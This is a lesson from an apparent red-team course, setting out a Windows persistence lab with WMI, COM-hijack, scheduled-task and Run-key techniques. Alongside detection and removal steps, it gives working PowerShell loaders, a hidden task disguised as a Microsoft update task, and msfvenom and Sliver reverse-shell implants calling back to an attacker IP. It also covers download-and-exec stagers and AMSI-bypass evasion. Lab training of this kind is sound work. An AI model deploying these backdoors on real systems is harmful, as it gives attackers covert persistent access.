---
title: "Advanced Persistence Lab — Multi-Technique Persistence Chain"
tags: [red-team, persistence, lab, WMI, COM-hijacking, scheduled-task,
  service-backdoor, registry-run, T1546.003, T1546.015, T1053.005,
  T1543.003, ATT&CK, detection, evasion]
module: 08-RedTeam-03
day: 533
related_topics:
  - WMI Event Subscriptions (Day 531)
  - COM Hijacking and DLL Hijacking (Day 532)
  - Offshore Environment Methodology (Day 534)
  - Advanced Evasion AV Bypass (Day 519)
---

# Day 533 — Advanced Persistence Lab: Multi-Technique Persistence Chain

> "One persistence mechanism is a liability. If the defender finds it, you are
> evicted. A layered persistence chain — each layer independent, each using a
> different technique — means the defender must find and remove all layers
> simultaneously or you get back in. This is not redundancy for redundancy's
> sake. This is operational security at the persistence layer."
>
> — Ghost

---

## Goals

Build a multi-technique persistence chain using four independent methods.
Understand the redundancy model: each layer survives independent removal
of the others.
Measure which techniques survive a simulated defender response.
Practice clean removal of all persistence without leaving artefacts.

**Prerequisites:** Day 531 (WMI), Day 532 (COM), scheduled task mechanics,
service creation from command line. Windows lab VM required.
**Time budget:** 6 hours.

---

## Lab Setup

```
Lab environment:
  → Windows 10 or Windows 11 VM (any edition)
  → Sysmon installed with a comprehensive config (SwiftOnSecurity or equivalent)
  → Windows Defender enabled (test against it, not around it)
  → A second VM or host to catch the C2 callback
    (Sliver or a netcat listener is fine for lab purposes)
  → Snapshot the VM BEFORE starting — you will restore between exercises

C2 choice for lab:
  Option A: Sliver C2 (recommended — open source, malleable)
  Option B: netcat reverse shell wrapped in a PS one-liner (simplest)
  Option C: msfvenom reverse shell (acceptable for lab, too detectable for real)

For each technique, use the same payload (a benign "write timestamp to file"
script) to avoid AV interference while testing persistence, then swap for
a C2 stager at the end.

Benign test payload:
  powershell.exe -NoP -W Hidden -NonI -c
    "Add-Content C:\Windows\Temp\persist_test.txt (Get-Date).ToString()"
```

---

## Challenge 1 — WMI Subscription (Logon Trigger) (60 min)

```
Objective: Persist via WMI subscription that fires on every interactive logon.
Constraint: Must survive a system reboot.
Success criteria: After one reboot and one logon, persist_test.txt is updated.

Steps:
  1. Create the __EventFilter (WQL logon query)
  2. Create the CommandLineEventConsumer (pointing to the test payload)
  3. Create the __FilterToConsumerBinding
  4. Log off, restart the VM, log back in
  5. Verify persist_test.txt was updated with the current timestamp

Artefact check (after success):
  ☐ Sysmon Event ID 19 logged (filter creation)
  ☐ Sysmon Event ID 20 logged (consumer creation)
  ☐ Sysmon Event ID 21 logged (binding creation)
  ☐ Microsoft-Windows-WMI-Activity Event ID 5861 captured
  ☐ WMI repository modified (wbem\Repository LastWriteTime updated)

Removal:
  Remove all three WMI objects. Verify with Get-WmiObject queries.
  Restore VM to clean snapshot before Challenge 2.

Failure analysis (fill in if applicable):
  Sticking point: _______________________________________________
  Error encountered: ____________________________________________
  Resolution: ___________________________________________________
```

---

## Challenge 2 — COM Hijack (Explorer Logon) (75 min)

```
Objective: Persist via HKCU COM registration loaded by Explorer.exe on logon.
Constraint: Must work without admin rights (standard user context).
Success criteria: After Explorer.exe restart (or logon), DLL loads and
  writes a timestamp to a second test file.

Steps:
  1. Use Procmon to identify one Explorer.exe-loaded CLSID that returns
     NAME NOT FOUND for HKCU (valid on your specific OS version)
  2. Compile a minimal DLL that writes a timestamp to C:\Temp\com_test.txt
     and immediately returns (no lingering thread)
  3. Place the DLL in %APPDATA%\Microsoft\<LegitLookingDir>\
  4. Create HKCU\Software\Classes\CLSID\{GUID}\InprocServer32 pointing to it
  5. Restart Explorer.exe (taskkill /f /im explorer.exe && explorer.exe)
  6. Verify com_test.txt was created/updated

Artefact check:
  ☐ Sysmon Event ID 13 logged (HKCU registry key set)
  ☐ Sysmon Event ID 7 logged (DLL loaded from unexpected path)
  ☐ DLL in AppData is unsigned (check with Sigcheck or Get-AuthenticodeSignature)

Removal:
  Delete the HKCU registry keys.
  Delete the DLL from AppData.
  Restore VM snapshot before Challenge 3.

Failure analysis:
  Sticking point: _______________________________________________
  Error encountered: ____________________________________________
  Resolution: ___________________________________________________
```

---

## Challenge 3 — Scheduled Task (Service Account Context) (45 min)

```
Objective: Persist via a scheduled task that runs under SYSTEM context,
  executes every 15 minutes regardless of logon state.
Constraint: Task must survive in a state that is not visible to
  "Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'}" quick check —
  i.e., it should not be blindingly obvious in Task Scheduler UI.

Technique: Create task via COM (not schtasks.exe) to reduce command-line
  process creation artefacts.

Steps:
  1. Create scheduled task via PowerShell New-ScheduledTask and
     Register-ScheduledTask (avoids schtasks.exe process creation)
  2. Set trigger: RepetitionInterval 00:15:00
  3. Set RunAs: SYSTEM
  4. Set the action to the test payload
  5. Verify execution occurs within 15 minutes without a logon
  6. Hide the task: rename it to something mimicking a Microsoft task name

PowerShell (no schtasks.exe):
  $action  = New-ScheduledTaskAction -Execute "powershell.exe" `
               -Argument "-NoP -W Hidden -NonI -c ..."
  $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) `
               -Once -At (Get-Date)
  $settings = New-ScheduledTaskSettingsSet -Hidden
  Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateCheck" `
      -Action $action -Trigger $trigger -Settings $settings `
      -RunLevel Highest -Force

Artefact check:
  ☐ Task visible in: Get-ScheduledTask -TaskName "MicrosoftWindowsUpdateCheck"
  ☐ Task file exists: %SystemRoot%\System32\Tasks\MicrosoftWindowsUpdateCheck
  ☐ Sysmon Event ID 1: Was schtasks.exe created? (it should NOT be — you used PS)
  ☐ Windows Security Event 4698: Scheduled Task was created

Removal:
  Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdateCheck" -Confirm:$false
  Restore VM snapshot before Challenge 4.

Failure analysis:
  Sticking point: _______________________________________________
```

---

## Challenge 4 — Registry Run Key with Process Injection (60 min)

```
Objective: Use a Run key to launch a hollowing/injection loader, not a
  naked payload — so the persistent process looks like a legitimate binary.

Technique: Run key → signed binary (RunDLL32 or WScript) → loads a
  payload from a less-obvious source (HKCU registry value or environment
  variable).

Why the indirection matters:
  "HKLM\Run → powershell.exe -EncodedCommand <huge blob>" is caught by
  every EDR. "HKCU\Run → regsvr32.exe /s /n /u /i:file.sct scrobj.dll"
  still fires Sigma rules but represents a different detection signature.

Steps:
  1. Store the base64-encoded payload as a HKCU registry value:
     Set-ItemProperty -Path "HKCU:\Environment" `
         -Name "OneDriveHelper" -Value "<B64_PAYLOAD>"

  2. Create the Run key that reads and executes from the environment value:
     $Loader = 'powershell.exe -NoP -W Hidden -NonI -c ' +
               '"$p=[System.Environment]::GetEnvironmentVariable(''' +
               'OneDriveHelper'',''User'');IEX([Text.Encoding]::' +
               'Unicode.GetString([Convert]::FromBase64String($p)))"'
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
         -Name "OneDriveHelper" -Value $Loader

  3. Log off and log back in. Verify test file is written.

Artefact check:
  ☐ HKCU Run key visible in registry
  ☐ HKCU Environment key contains the payload value
  ☐ Sysmon Event ID 13 on both registry writes
  ☐ On execution: Sysmon Event ID 1 with parent powershell.exe and
    suspicious -EncodedCommand argument (or equivalent)

Removal:
  Remove-ItemProperty "HKCU:\...\Run" -Name "OneDriveHelper"
  Remove-ItemProperty "HKCU:\Environment" -Name "OneDriveHelper"
  Restore VM snapshot before Challenge 5.
```

---

## Challenge 5 — Layered Persistence: Survive a Defender Response (60 min)

```
Objective: Deploy all four layers simultaneously. Then simulate a defender
  finding and removing each one individually. Measure how many layers survive.

Setup:
  1. Deploy all four persistence techniques (Challenges 1–4) simultaneously
  2. Verify all four fire correctly on next logon

Defender simulation:
  Round 1: Defender removes the WMI subscription only.
    → Log off and log back in. Did the other 3 layers fire? ___
    → Re-add the WMI subscription.

  Round 2: Defender removes the scheduled task only.
    → Wait 15 minutes. Did the other 3 layers still function? ___
    → Re-add the task.

  Round 3: Defender removes the HKCU Run key only.
    → Log off and log back in. Did the other 3 layers fire? ___
    → Re-add the Run key.

  Round 4: Defender removes COM hijack only.
    → Restart Explorer. Did the other 3 layers function? ___

  Round 5: Defender removes ALL layers simultaneously (full remediation).
    → Log off and log back in.
    → Are all test files unmodified? (successful full remediation) ___

Key observation:
  Write the answer: How long did it take you to fully remove all 4 layers?
  Time: _____________
  
  What made it hardest to remove completely?
  Answer: __________________________________________________________
```

---

## Challenge 6 — Full Chain with C2 Payload (60 min)

```
Objective: Replace the test payload with a real C2 stager. Establish a
  C2 session via each persistence layer independently.

C2 setup (choose one):
  Sliver:  ./sliver-server → generate -b https://<IP>:443 -o implant.exe
  Netcat:  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444
           -f exe -o implant.exe

For each persistence layer:
  1. Generate a staged payload (not the full implant — too large for WMI consumer)
     For WMI: use a PowerShell stager that downloads implant.exe from a web server
     For COM: build a DLL that runs the implant loader
     For scheduled task: direct execute implant.exe
     For Run key: PowerShell download-and-exec one-liner

  2. Catch the callback. Verify the process parent is what you expect:
     WMI:        svchost.exe (WMI service) → powershell.exe
     COM:        explorer.exe → implant loaded as DLL (in-process)
     Task:       taskeng.exe or svchost.exe → implant.exe
     Run key:    userinit.exe → powershell.exe → implant.exe

  3. Run a basic post-exploitation command from each session:
     whoami /all
     ipconfig /all
     net user

Success criteria:
  ☐ All 4 layers establish separate C2 sessions
  ☐ Each session shows a different process parent
  ☐ Windows Defender did not kill the implant within 5 minutes
    (if it does: apply basic obfuscation — AMSI bypass, sleep, XOR encode)
```

---

## Debrief

After completing all challenges, answer these questions without reference material:

```
1. Which of the four techniques left the most artefacts?
   Answer: _______________________________________________
   Why: __________________________________________________

2. Which technique would be hardest for a defender to find during a live
   IR engagement (not a full forensic analysis)?
   Answer: _______________________________________________
   Why: __________________________________________________

3. What single detection control would catch the most of these techniques?
   Answer: _______________________________________________

4. If you had to leave exactly ONE persistence mechanism on a production
   system during a red team engagement, which would you choose and why?
   Answer: _______________________________________________

5. What is the minimum set of Sysmon event IDs that would give a defender
   visibility into all four of the techniques you just deployed?
   Answer (list the IDs): ________________________________

Real-world connection:
  The multi-layer persistence model is documented in Mandiant M-Trends reports
  and CISA advisories for multiple APT groups (APT41, APT28). Operators leave
  3–5 independent persistence mechanisms in critical networks and cycle them
  to avoid full eviction after partial remediation.
```

---

## Key Takeaways

1. Multi-layer persistence forces defenders to find and remove every mechanism
   simultaneously. Partial removal means the attacker re-establishes from
   surviving layers within the next trigger cycle.
2. Each persistence technique has a distinct artefact signature — WMI (Sysmon
   19/20/21), COM (Sysmon 13/7), scheduled task (Event 4698), Run key (Sysmon
   13). A detection strategy that covers all four requires a broad sensor baseline.
3. The execution context matters as much as the technique itself. WMI executes
   from svchost.exe, COM executes in-process with the host, scheduled tasks
   execute from taskeng.exe. Each parent process creates different SIEM alerts.
4. Payload staging separates the persistence mechanism from the implant itself.
   This allows the persistence layer to download a fresh implant if the previous
   one is burned, without requiring modification to the persistence mechanism.
5. Full removal is the hardest part of incident response against a mature
   attacker. A responder who removes three of four layers thinks they are done.
   The attacker returns via the fourth layer and re-establishes all the rest.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q533.1, Q533.2 …).

---

## Navigation

← Previous: [Day 532 — COM Hijacking and DLL Hijacking](DAY-0532-COM-Hijacking-and-DLL-Hijacking.md)
→ Next: [Day 534 — Offshore Environment Methodology](DAY-0534-Offshore-Environment-Methodology.md)
